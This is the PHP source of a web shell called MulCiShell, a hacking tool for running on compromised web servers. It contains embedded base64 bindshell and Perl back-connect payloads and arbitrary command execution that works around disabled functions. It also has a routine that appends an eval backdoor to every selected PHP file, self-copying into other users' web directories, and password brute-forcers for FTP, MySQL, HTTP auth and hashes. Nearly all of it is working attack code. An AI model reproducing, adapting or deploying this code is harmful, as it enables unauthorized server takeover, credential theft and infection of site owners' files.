   1.
      <?php
   2.
      #/\/\/\/\/\  MulCiShell v0.2 /\/\/\/\/\/\/\#
   3.
      # Updates from version 1.0#
   4.
      # 1) Fixed MySQL insert function
   5.
      # 2) Fixed trailing dirs
   6.
      # 3) Fixed file-editing when set to 777
   7.
      # 4) Removed mail function (who needs it?)
   8.
      # 5) Re-wrote & improved interface
   9.
      # 6) Added actions to entire directories
  10.
      # 7) Added config+forum finder
  11.
      # 8) Added MySQL dump function
  12.
      # 9) Added DB+table creation, DB drop, table delete, and column+table count
  13.
      # 10) Updated security-info feature to include more useful details
  14.
      # 11) _Greatly_ Improved file browsing and handling
  15.
      # 12) Added banner
  16.
      # 13) Added DB-Parser and locator
  17.
      # 14) Added enumeration function
  18.
      # 15) Added common functions for bypassing security restrictions
  19.
      # 16) Added bindshell & backconnect (needs testing)
  20.
      # 17) Improved command execution (alts)
  21.
      #/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/#
  22.
      @ini_set("memory_limit","256M");
  23.
      @set_magic_quotes_runtime(0);
  24.
      session_start();
  25.
      ob_start();
  26.
      $start=microtime();
  27.
      if(isset($_GET['theme'])) $_SESSION['theme']=$_GET['theme'];
  28.
      //Thanks korupt ;)
  29.
      $backdoor_c="DQojaW5jbHVkZSA8YXNtL2lvY3Rscy5oPg0KI2luY2x1ZGUgPHN5cy90aW1lLmg+DQojaW5jbHVkZSA8c3lzL3NlbGVjdC5oPg0KI2luY2x1ZGUgPHN0ZGxpYi5oPg0KI2luY2x1ZGUgPHVuaXN0ZC5oPg0KI2luY2x1ZGUgPGVycm5vLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8bmV0ZGIuaD4NCiNpbmNsdWRlIDxzeXMvdHlwZXMuaD4NCiNpbmNsdWRlIDxuZXRpbmV0L2luLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPHN0ZGludC5oPg0KI2luY2x1ZGUgPHB0aHJlYWQuaD4NCg0Kdm9pZCAqQ2xpZW50SGFuZGxlcih2b2lkICpjbGllbnQpDQp7DQoJaW50IGZkID0gKGludCljbGllbnQ7DQoJZHVwMihmZCwgMCk7DQoJZHVwMihmZCwgMSk7DQoJZHVwMihmZCwgMik7DQoJaWYoZm9yaygpID09IDApDQoJCWV4ZWNsKCIvYmluL2Jhc2giLCAicmVzbW9uIiwgMCk7DQoJY2xvc2UoZmQpOw0KCXJldHVybiAwOw0KfQ0KDQppbnQgbWFpbihpbnQgYXJnYywgY2hhciAqYXJndltdKQ0Kew0KCWludCBtc29jaywgY3NvY2ssIGkgPSAxOw0KCXB0aHJlYWRfdCB0aHJlYWQ7DQoJc3RydWN0IHNvY2thZGRyIHNhZGRyOw0KCXN0cnVjdCBzb2NrYWRkcl9pbiBzYWRkckluOw0KICAgIGludCBwb3J0PWF0b2koYXJndlsxXSk7DQoJaWYoKG1zb2NrID0gc29ja2V0KEFGX0lORVQsIFNPQ0tfU1RSRUFNLCBJUFBST1RPX1RDUCkpID09IC0xKQ0KCQlyZXR1cm4gLTE7DQoNCglzYWRkckluLnNpbl9mYW1pbHkJCT0gQUZfSU5FVDsNCglzYWRkckluLnNpbl9hZGRyLnNfYWRkcgk9IElOQUREUl9BTlk7DQoJc2FkZHJJbi5zaW5fcG9ydAkJPSBodG9ucyhwb3J0KTsNCiAgIA0KCW1lbWNweSgmc2FkZHIsICZzYWRkckluLCBzaXplb2Yoc3RydWN0IHNvY2thZGRyX2luKSk7DQoJc2V0c29ja29wdChtc29jaywgU09MX1NPQ0tFVCwgU09fUkVVU0VBRERSLCAoY2hhciAqKSZpLCBzaXplb2YoaSkpOw0KIA0KCWlmKGJpbmQobXNvY2ssICZzYWRkciwgc2l6ZW9mKHNhZGRyKSkgIT0gMCl7DQoJCWNsb3NlKG1zb2NrKTsNCgkJcmV0dXJuIC0xOw0KCX0NCiANCglpZihsaXN0ZW4obXNvY2ssIDEwKSA9PSAtMSl7DQoJCWNsb3NlKG1zb2NrKTsNCgkJcmV0dXJuIC0xOw0KCX0NCiANCgl3aGlsZSgxKXsNCgkJaWYoKGNzb2NrID0gYWNjZXB0KG1zb2NrLCBOVUxMLCBOVUxMKSkgIT0gLTEpew0KCQkJcHRocmVhZF9jcmVhdGUoJnRocmVhZCwgMCwgaGFuZGxlciwgKHZvaWQgKiljc29jayk7DQoJCX0NCgl9DQoJDQoJcmV0dXJuIDE7DQp9";
  30.
      $backconnect_perl="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KbXkgKCRpYWRkciwkcG9ydCwkY21kKT1AQVJHVjsNCm15ICRwYWRkcj1zb2NrYWRkcl9pbigkcG9ydCwgaW5ldF9hdG9uKCRpYWRkcikpOw0KbXkgJHByb3RvID0gZ2V0cHJvdG9ieW5hbWUoInRjcCIpOw0Kc29ja2V0KFNPQ0tFVCwgUEZfSU5FVCwgU09DS19TVFJFQU0sICRwcm90byk7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKTsNCm9wZW4oU1RET1VULCI+JlNPQ0tFVCIpOw0Kb3BlbihTVERJTiwiPiZTT0NLRVQiKTsNCnByaW50IFNPQ0tFVCAiU2hlbGwgdGVzdFxuIjsNCnByaW50IGV4ZWMoJGNtZCk7DQpjbG9zZShTVERJTik7DQpjbG9zZShTVERPVVQpOw0K";
  31.
      $pl_scan="DQoJIyEvdXNyL2Jpbi9wZXJsDQp1c2Ugd2FybmluZ3M7DQp1c2Ugc3RyaWN0Ow0KdXNlIGRpYWdub3N0aWNzOw0KdXNlIElPOjpTb2NrZXQ6OklORVQ7DQpzdWIgdXNhZ2UNCnsNCglkaWUoIiQwIGhvc3Qgc3RhcnRwb3J0IGVuZHBvcnQKIik7DQp9DQp1c2FnZSB1bmxlc3MoQEFSR1Y+MSk7DQpteSgkaG9zdCwkcywkZSk9QEFSR1Y7DQpmb3JlYWNoKCRzLi4kZSkNCnsNCglteSAkc29jaz1JTzo6U29ja2V0OjpJTkVULT5uZXcNCgkoDQoJCVBlZXJBZGRyPT4kaG9zdCwNCgkJUGVlclBvcnQ9PiRfLA0KCQlQcm90bz0+J3RjcCcsDQoJCVRpbWVvdXQ9PjINCgkpOw0KCXByaW50ICJQb3J0ICBvcGVuCiIgaWYgKCRcc29jayk7DQp9DQoNCgk=";
  32.
      $access_control=0;
  33.
      $md5_user="MulCiber";
  34.
      $md5_pass="123";
  35.
      $user_agent="MulCiber";
  36.
      $allowed_addrs=array('127.0.0.1');
  37.
      $shell_email="mulciber-@hotmail.com";
  38.
      $self=basename($_SERVER['PHP_SELF']);
  39.
      $addr=$_SERVER['REMOTE_ADDR'];
  40.
      $serv=@gethostbyname($_SERVER['HTTP_HOST']);
  41.
      $soft=$_SERVER['SERVER_SOFTWARE'];
  42.
      $safe_mode=(@ini_get("safe_mode")=='')?"OFF":"ON";
  43.
      $open_basedir=(@ini_get("open_basedir")=='')?"OFF":"ON";
  44.
      $uname=@php_uname();
  45.
      $space=TrueSize(disk_free_space(realpath(getcwd())));
  46.
      $total=TrueSize(disk_total_space(realpath(getcwd())));
  47.
      $id=@execmd("id",$disable);
  48.
      $int_paths=array("mybb","phpbb","phpbb3","forum","forums","board","boards","bb","discuss");
  49.
      $inc_paths=array("includes","include","inc");
  50.
      $sql_build_path;
  51.
      echo "<script type=\"text/javascript\" language=\"javascript\">
  52.
      function togglecheck()
  53.
      {
  54.
         var cb=document.forms[0].check
  55.
         for (i in cb)
  56.
         {
  57.
             cb[i].checked=(cb[i].checked)?false:true;
  58.
         }
  59.
      }
  60.
      </script>";
  61.
      switch($access_control) #Break statements intentionally ommited
  62.
      {
  63.
          case 3:
  64.
          $ip_allwd=false;
  65.
          foreach($allowed_addrs as $addr)
  66.
          {
  67.
              if($addr==$_SERVER['REMOTE_ADDR']) {$ip_allwd=true; break;}
  68.
              if(!$ip_allwd) exit;
  69.
          }
  70.
          case 2:
  71.
          if(!isset($_SERVER['PHP_AUTH_USER'])||$_SERVER['PHP_AUTH_USER']!=$md5_user||$_SERVER['PHP_AUTH_PW']!=$md5_pass)
  72.
          {
  73.
                  header("WWW-Authenticate: Basic Realm=\"Restricted area\"");
  74.
                  header("HTTP/1.1 401 Unauthorized");
  75.
                  echo "Wrong username/password";
  76.
                  exit;
  77.
          }
  78.
          case 1:
  79.
          if($_SERVER['HTTP_USER_AGENT']!=$user_agent) exit;
  80.
      }
  81.
      if($id)
  82.
      {
  83.
              $s=strpos($id,"(",0)+1;
  84.
              $e=strpos($id,")",$s);
  85.
              $idval=substr($id,$s,$e-$s);
  86.
      }
  87.
      $disable=@ini_get("disable_functions");
  88.
      if(empty($disable)) $disable="None";
  89.
      function rm_rep($dir,&$success,&$fail)
  90.
      {
  91.
              @$dh=opendir($dir);
  92.
              if(is_resource($dh))
  93.
              {
  94.
              while((@$rm=readdir($dh)))
  95.
              {
  96.
                  if($rm=='.' || $rm=='..') continue;
  97.
                  if(is_dir($dir.'/'.$rm)) {echo "Deleting dir $dir/$rm...</br>"; rm_rep($dir.'/'.$rm,$success,$fail); continue;}
  98.
                  if(@unlink($dir.'/'.$rm)) {$success++;echo "Deleted $rm...</br>";}
  99.
                  else {$fail++; echo "Failed to delete $rm</br>";}
 100.
              }
 101.
              @closedir($dh);
 102.
          } else echo "Failed to open dir $dir</br>";
 103.
      }
 104.
      function chmod_rep($dir,&$success,&$fail,$mod_value)
 105.
      {
 106.
              @$dh=opendir($dir);
 107.
              if(is_resource($dh))
 108.
              {
 109.
              while((@$ch=readdir($dh)))
 110.
              {
 111.
                  if($ch=='.' || $ch=='..') continue;
 112.
                  if(is_dir($dir.'/'.$ch)) {echo "Changing file modes in dir $dir/$ch...</br>"; chmod_rep($dir.'/'.$ch,$success,$fail,$mod_value); continue;}
 113.
                  if(@chmod($dir.'/'.$ch,$mod_value)) {$success++;echo "Changed mode for $ch...</br>";}
 114.
                  else {$fail++; echo "Failed to chmod $rm</br>";}
 115.
              }
 116.
              @closedir($dh);
 117.
          } else echo "Failed to open dir $dir</br>";
 118.
      }
 119.
      #Complete these functions
 120.
      function spread_self($user,&$c=0,$d=0)
 121.
      {
 122.
                  if(!$d) $dir="/home/$user/public_html/";
 123.
                  else $dir=$d;
 124.
                  if(is_dir($dir)&&is_writable($dir))
 125.
                  {
 126.
                      copy(CleanDir(getcwd()).'/'.basename($_SERVER['PHP_SELF']),$dir.$f.'/mshell.php');
 127.
                      echo "[+] Shell copied to $dir.$f./mshell.php</br>";
 128.
                      $c++;
 129.
                  }
 130.
                  if(@$dh=opendir($dir)) echo "[-] Failed to open dir $dir</br>";
 131.
                  while((@$f=readdir($dh)))
 132.
                  {
 133.
                      if($f!="."&&$f!="..")
 134.
                      {
 135.
                          if(@is_dir($dir.$f))
 136.
                          {
 137.
                              echo "[+] Spreading to dir $dir</br>";
 138.
                              if(@is_writable($dir.$f))
 139.
                              {
 140.
                                  copy(CleanDir(getcwd()).'/'.basename($_SERVER['PHP_SELF']),$dir.$f.'/mshell.php');
 141.
                                  echo "[+] Shell copied to $dir.$f./mshell.php</br>";
 142.
                                  $c++;
 143.
                              }
 144.
                              $c+=spread_self($user,$c,$dir.$f.'/');
 145.
                          }
 146.
                      }
 147.
                  }
 148.
      }
 149.
      function copy_rep($dir,&$c)
 150.
      {
 151.
       
 152.
      }
 153.
      function backup_site()
 154.
      {
 155.
          if(!isset($_POST['busite']))
 156.
          {
 157.
              echo "<center>The following tool will attempt to retrieve every file from the specified dir (including child dirs).</br>If successful, you will be prompted for a site backup download.</br><i>Note: Only readable files will be downloaded. Images and executables will be discarded. This tool should only be used in scenarios in which you have to quickly retrieve a site's source.</i></center>";
 158.
          }
 159.
      }
 160.
      function infect_rep($dir,&$success,&$fail)
 161.
      {
 162.
      }
 163.
      function copy_dir($dir,$new_dir)
 164.
      {
 165.
      }
 166.
      ##################################
 167.
      function execmd($cmd,$d_functions="None")
 168.
      {
 169.
          if($d_functions=="None") {$ret=passthru($cmd); return $ret;}
 170.
          $funcs=array("shell_exec","exec","passthru","system","popen","proc_open");
 171.
          $d_functions=str_replace(" ","",$d_functions);
 172.
          $dis_funcs=explode(",",$d_functions);
 173.
          foreach($funcs as $safe)
 174.
          {
 175.
              if(!in_array($safe,$dis_funcs))
 176.
              {
 177.
                  if($safe=="exec")
 178.
                  {
 179.
                      $ret=@exec($cmd);
 180.
                      $ret=join("\n",$ret);
 181.
                      return $ret;
 182.
                  }
 183.
                  elseif($safe=="system")
 184.
                  {
 185.
                      $ret=@system($cmd);
 186.
                      return $ret;
 187.
                  }
 188.
                  elseif($safe=="passthru")
 189.
                  {
 190.
                      $ret=@passthru($cmd);
 191.
                      return $ret;
 192.
                  }
 193.
                  elseif($safe=="shell_exec")
 194.
                  {
 195.
                      $ret=@shell_exec($cmd);
 196.
                      return $ret;
 197.
                  }
 198.
                  elseif($safe=="popen")
 199.
                  {
 200.
                      $ret=@popen("$cmd",'r');
 201.
                      if(is_resource($ret))
 202.
                      {
 203.
                          while(@!feof($ret))
 204.
                          $read.=@fgets($ret);
 205.
                          @pclose($ret);
 206.
                          return $read;
 207.
                      }
 208.
                      return -1;
 209.
                  }
 210.
                  elseif($safe="proc_open")
 211.
                  {
 212.
                      $cmdpipe=array(
 213.
                      0=>array('pipe','r'),
 214.
                      1=>array('pipe','w')
 215.
                      );
 216.
                      $resource=@proc_open($cmd,$cmdpipe,$pipes);
 217.
                      if(@is_resource($resource))
 218.
                      {
 219.
                          while(@!feof($pipes[1]))
 220.
                          $ret.=@fgets($pipes[1]);
 221.
                          @fclose($pipes[1]);
 222.
                          @proc_close($resource);
 223.
                          return $ret;
 224.
                      }
 225.
                      return -1;
 226.
                  }
 227.
              }
 228.
          }
 229.
          return -1;
 230.
      }
 231.
      $links=array("Enumerate"=>"$self?act=enum","Files"=>"$self?act=files","Domains"=>"$self?act=domains","MySQL"=>"$self?act=sql","Encoder"=>"$self?act=encode",
 232.
      "Sec. Info"=>"$self?act=sec","Cracker"=>"$self?act=bf",
 233.
      "Bypassers"=>"$self?act=bypass","Tools"=>"$self?act=tools","Databases"=>"$self?act=dbs","Backdoor Host"=>"$self?act=bh","Back Connect"=>"$self?act=backc","Spread Shell"=>"$self?act=spread","Kill Shell"=>"$self?act=kill");
 234.
          echo "<html><head><title>MulCiShell v2.0</title></head>";
 235.
          switch($_SESSION['theme'])
 236.
          {
 237.
              case 'green':
 238.
              echo "<style>
 239.
                 body{color:#66FF00; font-size: 12px; font-family: serif; background-color: black;}
 240.
                 td {border: 1px solid #00FF00; background-color:#001f00; padding: 2px; font-size: 12px; color: #33FF00;}
 241.
                 td:hover{background-color: black; color: #33FF00;}
 242.
                 input{background-color: black; color: #00FF00; border: 1px solid green;}
 243.
                 input:hover{background-color: #006600;}
 244.
                 textarea{background-color: black; color: #00FF00; border: 1px solid white;}
 245.
                 a {text-decoration: none; color: #66FF00; font-weight: bold;}
 246.
                 a:hover {color: #00FF00;}
 247.
                 select{background-color: black; color: #00FF00;}
 248.
                 #main{border-bottom: 1px solid #33FF00; padding: 5px; text-align: center;}
 249.
                 #main a{padding-right: 15px; color:#00CC00; font-size: 12px; font-family: arial; text-decoration: none; }
 250.
                 #main a:hover{color: #00FF00; text-decoration: underline;}
 251.
                 #bar{width: 100%; position: fixed; background-color: black; bottom: 0; font-size: 10px; left: 0; border-top: 1px solid #FFFFFF; height: 12px; padding: 5px;}
 252.
                 </style>
 253.
                 <body>";
 254.
              break;
 255.
              case 'dark':
 256.
                  echo "<style>
 257.
                 body{color: #FFFFFF; font-size: 12px; font-family: serif; background-color: #000000;}
 258.
                 td {border: 1px solid #FFFFFF; background-color: #000000; padding: 2px; font-size: 12px; color: #FFFFFF;}
 259.
                 input{background-color: black; color: #FFFFFF;; border: 1px solid #FFFFFF;}
 260.
                 input:hover{background-color: #000099;}
 261.
                 textarea{background-color: #000000; color: #FFFFFF; border: 1px solid white;}
 262.
                 a {text-decoration: none; color: #FFFFFF; font-weight: bold;}
 263.
                 a:hover {font-weight: bold;}
 264.
                 select{background-color: #000000; color: #FFFFFF;}
 265.
                 #main{border-bottom: 1px solid white; padding: 5px; text-align: center;}
 266.
                 #main a{padding-right: 15px; color:#FFFFFF; font-size: 12px; font-family: arial; text-decoration: none; }
 267.
                 #main a:hover{font-weight: bold;}
 268.
                 #bar{width: 100%; position: fixed; background-color: black; bottom: 0; font-size: 10px; left: 0; border-top: 1px solid #FFFFFF; height: 12px; padding: 5px;}
 269.
                 </style><body>";
 270.
              break;
 271.
              default:
 272.
                  echo "<style>
 273.
                 body{color: white; font-size: 12px; font-family: arial; scrollbar-base-color:blue; scrollbar-arrow-color:yellow; scrollbar-face-color:blue; }
 274.
                 td {border: 1px solid #000099; background-color: #000033; padding: 2px; font-size: 12px; color: white; }
 275.
                 input{background-color: black; color: white; border: 1px solid #000066;}
 276.
                 input:hover{background-color: #000066; border: 1px solid white;}
 277.
                 td:hover {color: yellow; background: black;}
 278.
                 textarea{background-color: #000033; color: white; border: 1px solid white;}
 279.
                 a {text-decoration: none; color: white; font-weight: bold;}
 280.
                 a:hover {color: yellow}
 281.
                 select{background-color: black; color: white;}
 282.
                 #main{border-bottom: 1px solid #0066FF; padding: 5px; text-align: center;}
 283.
                 #main a{padding-right: 15px; color: white; font-size: 12px; font-family: arial; text-decoration: none; }
 284.
                 #main a:hover{color: #0033FF; text-decoration: underline;}
 285.
                 #bar{width: 100%; position: fixed; background-color: black; bottom: 0; font-size: 10px; left: 0; border-top: 1px solid #FFFFFF; height: 12px; padding: 5px;}
 286.
                 </style>
 287.
                 <body bgcolor='black'>";
 288.
                  break;
 289.
          }
 290.
          echo base64_decode("PGNlbnRlcjxpbWcgc3JjPSdodHRwOi8vaW1nNTI5LmltYWdlc2hhY2sudXMvaW1nNTI5LzExNjYv
 291.
      bWlsY2lzaGVsbGxrNi5wbmcnPjwvY2VudGVyPg==");
 292.
      echo "<table style='width: inherit; margin: auto; text-align: center;'>
 293.
      <tr><td>Server IP</td><td>Your IP</td><td>Disk space</td><td>Safe_mode?</td><td>Open_BaseDir?</td><td>System</td><td>Server software</td><td>Disabled functions</td><td>ID</td><td>Shell location</td></tr>
 294.
      <tr><td>$serv</td><td>$addr</td><td>$space of $total</td><td>$safe_mode</td><td>$open_basedir</td><td>$uname</td><td>$soft</td><td>$disable</td><td>$idval</td><td>".CleanDir(getcwd()).'/'.basename($_SERVER['PHP_SELF'])."</td></tr>
 295.
      </table></br>
 296.
      <div id='main'>";
 297.
      foreach($links as $val=>$addr) echo "<a href='$addr'>[ $val ]</a>";
 298.
      echo "</div><br>";
 299.
      if(isset($_POST['encryption']))
 300.
      {
 301.
          $e=$_POST['encrypt'];
 302.
          echo "<form action='$self?' method='post'><center><textarea rows='19' cols='75' readonly>MD5: ".md5($e)."\nSHA1: ".sha1($e)."\nCrypt: ".crypt($e)."\nCRC32: ".crc32($e)."\nBase64 Encoded: ".base64_encode($e)."\nBase64 decoded: ".base64_decode($e)."\nURL encode: ".urlencode($e)."\nURL decode: ".urldecode($e)."\nBin2Hex ".bin2hex($e)."\nDec2Hex: ".dechex($e)."</textarea><br><br>Input: <input type='text' style='width: 300px' name='encrypt'>
 303.
         <br><input type='submit' value='Encrypt' name='encryption'></center>";
 304.
      }
 305.
      if(isset($_POST['dogetfile']))
 306.
      execmd("wget $_POST[wgetfile]",$disable);
 307.
      if(isset($_POST['doUpload']))
 308.
      {
 309.
          $dir=$_POST['u_location'];
 310.
          $name=$_FILES['u_file']['name'];
 311.
          switch($_FILES['u_file']['error'])
 312.
          {
 313.
              case 0:
 314.
              if(@move_uploaded_file($_FILES['u_file']['tmp_name'],$dir.'/'.$name))
 315.
              echo "File uploaded successfully<br>";
 316.
              else echo "Failed to upload file!";
 317.
          }
 318.
      }
 319.
      if(isset($_POST['massfiles']))
 320.
      {
 321.
          $fail=0;
 322.
          $success=0;
 323.
          switch($_POST['fileaction'])
 324.
          {
 325.
              case 'Infect': #Nothing special here, just kick them while they're down
 326.
             foreach($_POST['files'] as $file)
 327.
              {
 328.
                  $ext=strrchr($file,'.');
 329.
                  if($ext!=".php") continue;
 330.
                  @$fh=fopen($file,'a');
 331.
                  if(@is_resource($fh))
 332.
                  {
 333.
                      $success++;
 334.
                      @fwrite($fh,"<?php @eval(\$_GET['e']) ?>");
 335.
                      @fclose($fh);
 336.
                  } else $fail++;
 337.
              }
 338.
              echo "Successfully infected $success files; failed to infect $fail files</br>Exploit files as such: file.php?e=php code";
 339.
              break;
 340.
              case 'Delete':
 341.
              foreach($_POST['files'] as $file)
 342.
              {
 343.
                  if(is_dir($file)) rm_rep($file,$success,$fail);
 344.
                  else
 345.
                  {
 346.
                      if(@unlink(CleanDir($file)))
 347.
                      {
 348.
                          echo "File $file deleted<br>";
 349.
                          $success++;
 350.
                      }
 351.
                      else
 352.
                      {
 353.
                          echo "Failed to delete file $file<br>";
 354.
                          $fail++;
 355.
                      }
 356.
                  }
 357.
              }
 358.
              echo "Total files deleted: $success; failed to delete $fail files<br>";
 359.
              break;
 360.
              case 'Chmod':
 361.
              foreach($_POST['files'] as $file)
 362.
              {
 363.
                  if(is_dir($file)) chmod_rep($file,$success,$fail,$_POST['cmodv']);
 364.
                  if(@chmod(CleanDir($file),$_POST['cmodv']))
 365.
                  {
 366.
                      echo "Changed mode for $file<br>";
 367.
                      $success++;
 368.
                  }
 369.
                  else
 370.
                  {
 371.
                      echo "Failed to change mode for $file<br>";
 372.
                      $fail++;
 373.
                  }
 374.
              }
 375.
              echo "Total files modes modified: $success; failed to chmod $fail files<br>";
 376.
              break;
 377.
          }
 378.
      }
 379.
      if(isset($_POST['docrack']))
 380.
      {
 381.
              $con=true;
 382.
              $show=0;
 383.
              $list=@fopen($_FILES['wordlist']['tmp_name'],'r');
 384.
              if(is_resource($list))
 385.
              {
 386.
                  if(isset($_POST['ftpcrack']))
 387.
                  {
 388.
                      echo "Bruting $_POST[ftp_user]@$_POST[ftp_host]...</br>";
 389.
                      if(!empty($_POST['ftp_port'])) $port=$_POST['ftp_port'];
 390.
                      else $port='3306';
 391.
                      if(empty($_POST['ftp_timeout'])||!preg_match("/^[0-9]$/",$_POST['ftp_timeout']))
 392.
                      $time=3;
 393.
                      else $time=$_POST['ftp_timeout'];
 394.
                      @$ftp=ftp_connect($_POST['ftp_host'],$port,$time);
 395.
                      if(!$ftp) $con=false;
 396.
                      if($con)
 397.
                      {
 398.
                          $show++;
 399.
                          while(!feof($list))
 400.
                          {
 401.
                              @$pass=fgets($list);
 402.
                              if(ftp_login($ftp,$_POST['ftp_user'],trim($pass)))
 403.
                              {
 404.
                                  echo "Password found! Password for $_POST[ftp_user] is $pass<br>";
 405.
                                  @ftp_close($ftp);
 406.
                                  break;
 407.
                              }
 408.
                              if($show==10000){echo "Trying pass $pass...</br>"; $show=0;}
 409.
                          }
 410.
                      } else echo "Failed to connect!</br>";
 411.
                  }
 412.
                  elseif(isset($_POST['remote_login']))
 413.
                  {
 414.
                      //if(!function_exists("jitghjytiojho")) die("cURL support has to be enabled.");
 415.
                      /*
 416.
                      $ch=curl_init($_POST['remote_login_target']);
 417.
                      curl_setopt($ch,CURLOPT_HEADER,0);
 418.
                      curl_setopt($ch,CURLOPT_POST,1);
 419.
                      curl_setopt($ch,CURLOPT_POSTFIELDS,'');
 420.
                      curl_exec($ch);
 421.
                      */
 422.
                      if(preg_match("/^http:\/\/+/",$_POST['remote_login_target'])) die("Do not include http:// in the target URL.");
 423.
                      $path=explode('/',$_POST['remote_login_target']);
 424.
                      $site=$path[0];
 425.
                      for($i=1;$i<count($path);$i++) $full_path.='/'.$path[$i];
 426.
                     
 427.
                  }
 428.
                  elseif(isset($_POST['vbcrack']))
 429.
                  {
 430.
                      if(empty($_POST['vbhash']) OR empty($_POST['vbsalt'])) die("Please specify a hash and salt");
 431.
                      while(!feof($list))
 432.
                      {
 433.
                          $show++;
 434.
                          $pass=trim(fgets($list));
 435.
                          $vbenc=md5(md5($pass).$_POST['vbsalt']);
 436.
                          if($vbenc===$_POST['vbhash'])
 437.
                          {
 438.
                              echo "Password for $_POST[vbhash] found! is $pass</br>";
 439.
                              break;
 440.
                          }
 441.
                          if($show===10000)
 442.
                          {
 443.
                              $show=0;
 444.
                              echo "Trying pass $pass...</br>";
 445.
                          }
 446.
                      }
 447.
                      echo "Complete</br>";
 448.
                  }
 449.
                  elseif(isset($_POST['mysqlcrack']))
 450.
                  {
 451.
                      $host=$_POST['mysql_host'];
 452.
                      $user=$_POST['mysql_user'];
 453.
                      if(!empty($_POST['mysql_port']))  $host.=":$_POST[mysql_port]";
 454.
                          while(!feof($list))
 455.
                          {
 456.
                              $show++;
 457.
                              $pass=trim(fgets($list));
 458.
                              if(@mysql_connect($host,$user,$pass))
 459.
                              {
 460.
                                  echo "Password found! Password for $user is $pass</br>";
 461.
                                  break;
 462.
                              }
 463.
                              if($show==10000)
 464.
                              {
 465.
                                  echo "Trying $pass...</br>";
 466.
                                  $show=0;
 467.
                                  continue;
 468.
                              }
 469.
                          }
 470.
                  }
 471.
                  elseif(isset($_POST['authcrack']))
 472.
                  {
 473.
                      $arr=explode('/',$_POST['auth_url']);
 474.
                      $con_url=$arr[0];
 475.
                      if(empty($_POST['auth_url'])) die("Enter a target first...");
 476.
                      for($i=1;$i<count($arr);$i++) $path.='/'.$arr[$i];
 477.
                      if(preg_match("/^http:\/\/+/",$_POST['auth_url'])) die("Do not include http:// in the url");
 478.
                      while(!feof($list))
 479.
                      {
 480.
                              if(is_resource($conn_url=fsockopen($con_url,80,$errno,$errstr,5)))
 481.
                              {
 482.
                                  $show++;
 483.
                                  $pass=trim(fgets($list));
 484.
                                  if($show>5000) {$show=0; echo $pass;}
 485.
                                  $encode=base64_encode(trim($_POST['auth_user']).':'.$pass);
 486.
                                  $header="GET $path HTTP/1.1\r\n";
 487.
                                  $header.="Host: $con_url\r\n";
 488.
                                  $header.="Authorization: Basic $encode\r\n";
 489.
                                  $header.="Connection: Close\r\n\r\n";
 490.
                                  fputs($conn_url,$header,strlen($header));
 491.
                                  $tmp++;
 492.
                                  while(!feof($conn_url))
 493.
                                  {
 494.
                                      $tmp=fgets($conn_url);
 495.
                                      if(preg_match("/HTTP\/\d+\.\d+ 200+/",$tmp))
 496.
                                      {
 497.
                                          echo "Password found! Password=$pass</br></br>";
 498.
                                          break 2;
 499.
                                      }
 500.
                                  }
 501.
                              }
 502.
                      }
 503.
                      echo "Done</br>";
 504.
                  }
 505.
                  elseif(isset($_POST['md5crack']))
 506.
                  {
 507.
                      if(empty($_POST['md5hash'])) die("Enter a hash before attempting to crack one ;)");
 508.
                      $md5=trim($_POST['md5hash']);
 509.
                      while(!feof($list))
 510.
                      {
 511.
                          $show++;
 512.
                          $pass=trim(fgets($list));
 513.
                          if(md5($pass)===$md5)
 514.
                          {
 515.
                              echo "Password found! Plaintext for $md5 is $pass</br>";
 516.
                              break;
 517.
                          }
 518.
                          if($show==10000)
 519.
                          {
 520.
                              echo "Trying $pass...</br>";
 521.
                              $show=0;
 522.
                              continue;
 523.
                          }
 524.
                       }
 525.
                  }
 526.
                  elseif(isset($_POST['sha1crack']))
 527.
                  {
 528.
                      if(empty($_POST['sha1hash'])) die("Enter a hash before attempting to crack one ;)");
 529.
                      $sha1=trim($_POST['sha1hash']);
 530.
                      while(!feof($list))
 531.
                      {
 532.
                          $show++;
 533.
                          $pass=trim(fgets($list));
 534.
                          if(sha1($pass)===$sha1)
 535.
                          {
 536.
                              echo "Password found! Plaintext for $sha1 is $pass</br>";
 537.
                              break;
 538.
                          }
 539.
                          if($show==10000)
 540.
                          {
 541.
                              echo "Trying $pass...</br>";
 542.
                              $show=0;
 543.
                              continue;
 544.
                          }
 545.
                       }
 546.
                  }
 547.
              }
 548.
              @fclose($list);
 549.
      }
 550.
      if(isset($_POST['port_scan']))
 551.
      {
 552.
          switch($_POST['type'])
 553.
          {
 554.
              case 'php':
 555.
                  extract($_POST);
 556.
                  while($sport<=$eport)
 557.
                  {
 558.
                      echo "Trying port $sport";
 559.
                      if(@fsockopen($host,$sport,$errno,$errstr,2)) echo "Port $sport open</br>";
 560.
                      $sport++;
 561.
                  }
 562.
              break;
 563.
              default:
 564.
                  echo "Invalid request</br>";
 565.
          }
 566.
      }
 567.
      if(isset($_POST['find_forums']))
 568.
      {
 569.
          echo "<center><b>[ Forum locator ]</b></center></br></br>";
 570.
          $found=0;
 571.
          global $int_paths;
 572.
          @$fp=fopen($_POST['passwd'],'r') or die("Failed to open passwd file!");
 573.
          while(!feof($fp))
 574.
          {
 575.
              @list($user,$x,$uid,$gid,$blank,$home_dir)=explode(":",fgets($fp));
 576.
              $path="/home/$user/public_html";
 577.
              if(@is_dir($path))
 578.
              {
 579.
                  foreach($int_paths as $forum_path)
 580.
                  {
 581.
                      $full_path=$path."/$forum_path/";
 582.
                      if(@is_dir($full_path))
 583.
                      {
 584.
                          echo "[+] Forum found: Path: $full_path</br>";
 585.
                          $found++;
 586.
                          continue;
 587.
                      }
 588.
                  }
 589.
              }
 590.
          }
 591.
          echo "Scan complete. Found $found forums</br></br>";
 592.
      }
 593.
      function find_configs($path,&$found)
 594.
      {
 595.
              if(@file_exists($path.'config.php'))
 596.
              {
 597.
                  echo "Found config file: $path"."config.php</br>";
 598.
                  $found++;
 599.
              }
 600.
              @$dh=opendir($path);
 601.
              while((@$file=readdir($dh)))
 602.
              if(is_dir($file)&&$file!='.'&&$file!='..') find_configs($path.$file.'/',$found);
 603.
              @closedir($dh);
 604.
      }
 605.
      if(isset($_POST['find_configs']))
 606.
      {
 607.
          $found=0;
 608.
          echo "<center><b>[ Config locator ]</b></center></br></br>";
 609.
